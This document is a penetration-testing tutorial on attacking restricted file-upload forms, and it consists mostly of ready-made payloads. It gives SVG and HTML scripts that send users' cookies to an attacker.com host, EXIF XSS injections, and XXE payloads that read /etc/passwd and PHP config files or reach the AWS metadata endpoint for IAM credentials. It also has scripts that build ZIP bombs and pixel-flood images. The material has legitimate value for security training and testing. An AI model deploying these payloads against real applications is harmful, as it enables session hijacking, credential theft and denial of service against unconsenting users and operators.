# Limited File Upload Attacks

When an upload form is genuinely restricted to safe file types and all filter bypasses fail, the attack surface shifts. Several file formats that appear entirely benign carry embedded attack capabilities that target users, the XML parser, or the server's resource allocation rather than requiring PHP execution.

***

## XSS via File Upload

### SVG Files

SVG is the most powerful XSS vector among uploadable file types because SVG is XML-based and browsers render `<script>` tags inside SVG files as live JavaScript.  Unlike injecting a script into a filename or metadata field, an SVG payload executes the moment any user's browser renders the image, with no interaction required beyond viewing the page. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black"/>
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

A more impactful SVG payload for session hijacking:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
    <script>
        fetch('https://attacker.com/steal?c=' + document.cookie);
    </script>
</svg>
```

Upload as `malicious.svg`. Every user whose browser renders this file executes the JavaScript in the context of the target domain, making cookies, localStorage, and DOM content accessible to the attacker. 

### EXIF Metadata XSS

When an application displays image metadata after upload, injecting XSS into EXIF fields targets any user who views that metadata display. The `Comment`, `Artist`, `Copyright`, and `ImageDescription` fields all accept raw text: 

```bash
# Inject XSS into the Comment field of a legitimate image
exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' image.jpg

# Inject into multiple fields for better coverage
exiftool -Artist='"><script>alert(1)</script>' \
         -Copyright='<svg onload=alert(1)>' \
         image.jpg

# Verify the payload was written
exiftool image.jpg | grep -E "Comment|Artist|Copyright"
```

### HTML File Upload

If the application allows HTML uploads, any JavaScript embedded in the file executes in the origin of the web application when a user visits the uploaded file's URL. This is effectively stored XSS with full JavaScript execution privileges in the target domain:

```html
<!DOCTYPE html>
<html>
<body>
<script>
    // Runs in context of target.com if hosted there
    document.location = 'https://attacker.com/steal?c=' + document.cookie;
</script>
</body>
</html>
```

***

## XXE via SVG Upload

SVG files processed by server-side XML parsers are vulnerable to XXE injection regardless of whether the file is ever displayed in a browser. The attack triggers at parse time on the server, not render time in the client browser. 

### Reading Local Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">
    <text font-size="12" x="0" y="20">&xxe;</text>
</svg>
```

When the server processes this SVG (for thumbnail generation, validation, conversion, or display), the XML parser fetches `/etc/passwd` and substitutes it at `&xxe;`. The content appears either directly in the response or in the rendered image. 

### Reading PHP Source Code

Combining XXE with the PHP filter wrapper achieves the same source code disclosure as LFI PHP filters, but through the upload vector:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config.php">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>&xxe;</text>
</svg>
```

The base64-encoded source of `config.php` appears in the SVG output, which can then be decoded locally:

```bash
echo 'PD9waHAK...' | base64 -d
```

### SSRF via XXE

XXE in SVG also enables SSRF by pointing the entity at internal network addresses:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text>&ssrf;</text>
</svg>
```

This fetches the AWS Instance Metadata Service endpoint if the server runs on AWS, potentially returning IAM credentials, instance identity, and network configuration. The same technique probes internal services:

```xml
<!ENTITY ssrf SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY ssrf SYSTEM "http://192.168.1.1/router-admin">
```

### XXE in Office Documents

XXE is not exclusive to SVG. Office formats (DOCX, XLSX, PPTX) and PDF files are ZIP archives containing XML. If the application processes these with a vulnerable parser, the same XXE payloads work by injecting into the document XML: 

```bash
# Unzip a DOCX, modify word/document.xml to inject XXE, rezip
unzip document.docx -d doc_extracted/
# Edit doc_extracted/word/document.xml to add XXE declaration
zip -r malicious.docx doc_extracted/
```

***

## Denial of Service Attacks

### Decompression Bomb (ZIP)

If the application automatically extracts uploaded archives, a recursive ZIP bomb expands exponentially during decompression.  The classic example is [42.zip](https://unforgettable.dk/), a 42KB file that decompresses to 4.5 petabytes through nested layers of 16 files per archive: 

```bash
# Create a simple decompression bomb manually
# Layer 3 (innermost): create a 1GB file of zeros
dd if=/dev/zero bs=1M count=1024 | gzip > layer3.gz

# Layer 2: zip containing 10 copies of layer3
for i in {1..10}; do cp layer3.gz layer3_$i.gz; done
zip layer2.zip layer3_*.gz

# Layer 1: zip containing 10 copies of layer2
for i in {1..10}; do cp layer2.zip layer2_$i.zip; done
zip bomb.zip layer2_*.zip
# bomb.zip is small; extracted size grows exponentially
```

### Pixel Flood Attack

JPG and PNG store image dimensions separately from their compressed pixel data. Modifying the dimension headers to report a massive canvas while keeping the file itself small forces the server to allocate memory proportional to the declared dimensions when attempting to process or resize the image. 

```bash
# Using ImageMagick to create a malicious PNG with falsified dimensions
# The actual image is 1x1 but reports as 65535x65535
convert -size 1x1 xc:white original.png

# Then hex-edit the PNG IHDR chunk to change width/height to 0xFFFF
# Width bytes (offset 16-19): FF FF FF FF
# Height bytes (offset 20-23): FF FF FF FF
python3 -c "
with open('original.png', 'rb') as f:
    data = bytearray(f.read())
# PNG IHDR chunk: width at offset 16, height at offset 20
data[16:20] = b'\xff\xff\xff\xff'  # width = 4294967295
data[20:24] = b'\xff\xff\xff\xff'  # height = 4294967295
with open('pixelflood.png', 'wb') as f:
    f.write(data)
"
```

When the server calls an image processing function on this file and attempts to allocate a buffer for `width * height * bytes_per_pixel`, the resulting allocation request exhausts available memory and crashes the process. 

### Oversized File Upload

The simplest DoS: if the application does not enforce a maximum file size, upload a file large enough to exhaust disk space:

```bash
# Generate a 10GB file of zeros
dd if=/dev/zero of=large_file.jpg bs=1G count=10
```

***

## Attack Selection by Allowed File Type

| Allowed Type | XSS | XXE | SSRF | DoS | RCE Potential |
|-------------|:---:|:---:|:----:|:---:|:-------------:|
| SVG | Yes | Yes | Yes | No | Via XXE chain |
| HTML | Yes | No | No | No | No |
| JPEG/PNG | Via EXIF | No | No | Pixel flood | No |
| ZIP/GZ | No | No | No | Decompression bomb | No |
| DOCX/XLSX | No | Yes | Yes | No | Via macro |
| PDF | No | Yes | Yes | No | Via JS in PDF |
| XML | No | Yes | Yes | XXE billion laughs | No |

The SVG format is the highest-value target when arbitrary PHP execution is blocked, offering three independent attack classes from a single file type.  Even applications that appear to allow only image uploads may silently support SVG because it is technically a valid image format, making it worth testing even when the file picker dialog shows only image extensions. 
